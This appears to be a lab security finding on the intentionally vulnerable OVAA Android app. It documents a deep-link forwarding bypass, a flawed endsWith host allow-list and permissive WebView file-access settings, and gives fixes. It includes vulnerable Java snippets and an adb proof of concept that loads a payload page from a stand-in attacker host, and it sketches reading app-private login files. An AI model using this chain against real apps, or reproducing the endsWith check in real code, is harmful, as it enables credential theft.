# OVAA — WebView Deep Link Host-Validation Bypass (Exported→Non-Exported Forwarding)

## Components
- `DeeplinkActivity` (exported=true) — handles `oversecured://ovaa/*` deep links
- `WebViewActivity` (exported=false) — hosts a misconfigured WebView

## Vulnerability

### 1. Exported-component forwarding bypass
`WebViewActivity` is declared `exported="false"`, intending to block external apps
from launching it directly. However, `DeeplinkActivity` is `exported="true"` and,
for the `/webview` path, forwards an attacker-controlled `url` query parameter
straight into `WebViewActivity` via an explicit Intent:

```java
Intent i2 = new Intent(this, (Class<?>) WebViewActivity.class);
i2.putExtra("url", url);
startActivity(i2);
```

This defeats the `exported=false` protection — any external caller that can
trigger `DeeplinkActivity` (another app, a link in a browser/chat app, adb)
can reach `WebViewActivity` and control its `url` extra.

### 2. Broken host-allowlist validation
Before forwarding, `DeeplinkActivity` attempts to restrict the target host:

```java
if ((host = Uri.parse(url).getHost()) != null && host.endsWith("example.com"))
```

`String.endsWith()` performs a raw suffix match with no domain/dot-boundary
check. Any attacker-registered domain whose name happens to end in the
literal characters `example.com` passes — e.g. `evilexample.com`,
`notexample.com`, `attacker-example.com`.

### 3. WebView misconfiguration
`WebViewActivity` enables JavaScript and loads the forwarded URL with no
`shouldOverrideUrlLoading` filtering and `allowFileAccessFromFileURLs(true)`:

```java
webView.getSettings().setJavaScriptEnabled(true);
webView.getSettings().setAllowFileAccessFromFileURLs(true);
webView.loadUrl(getIntent().getStringExtra("url"));
```

This setting permits a `file://`-origin page to make cross-origin
`fetch()`/XHR requests to other local files, which is normally blocked
by same-origin policy for `file://` content.

## PoC — Access control bypass (confirmed)

```
adb shell am start -W -a android.intent.action.VIEW \
  -d "oversecured://ovaa/webview?url=http://evilexample.com:8000/payload.html"
```

Result:
```
Starting: Intent { act=android.intent.action.VIEW dat=oversecured://ovaa/... }
Activity: oversecured.ovaa/.activities.WebViewActivity
```

This confirms the forwarding + host-bypass chain works as designed:
`host.endsWith("example.com")` accepted `evilexample.com`, and the exported
`DeeplinkActivity` successfully launched the non-exported `WebViewActivity`
with the attacker-supplied URL intact.

## Impact (not independently confirmed in this test environment)

The combination of (1) attacker-reachable `loadUrl()` with no URL filtering
and (2) `allowFileAccessFromFileURLs(true)` suggests local file disclosure
should be achievable — e.g. reading app-private files such as
`shared_prefs/login_data.xml` via a `file://`-origin page making a
cross-origin `fetch()` to another `file://` path.

Attempts to demonstrate this in the test environment (Pixel_6_root AVD,
SDK 37) were blocked by environment-specific factors unrelated to the
underlying bug:
- Plain `http://` delivery of the payload was blocked by the platform's
  default Network Security Config (`targetSdkVersion=36` blocks cleartext
  traffic by default).
- `file://` URIs with a non-empty host (used to satisfy the `endsWith`
  check) are rejected outright by WebView/Chromium's file-access handling,
  independent of the app's own logic.
- Tooling to bypass the cleartext restriction (Frida) failed in this
  specific AVD due to an SELinux policy format incompatibility with
  available frida-server builds on this bleeding-edge Android build (SDK 37).

This is noted as a methodology limitation of the test environment, not
a limitation of the vulnerability itself. The root cause (missing dot-
boundary check + unsafe forward + permissive WebView settings) is proven
by source review and the access-bypass PoC above.

## Root Cause
- Export-forwarding without re-checking caller trust
- Suffix match instead of proper domain-suffix validation
- Overly permissive WebView file-access settings with no URL filtering

## Fix
```java
host.equals("example.com") || host.endsWith(".example.com")
```
- Remove `allowFileAccessFromFileURLs` / `allowUniversalAccessFromFileURLs`
  unless explicitly required
- Implement `shouldOverrideUrlLoading` with an explicit URL allow-list
- Re-validate caller intent data at the destination activity, not only
  at the forwarding activity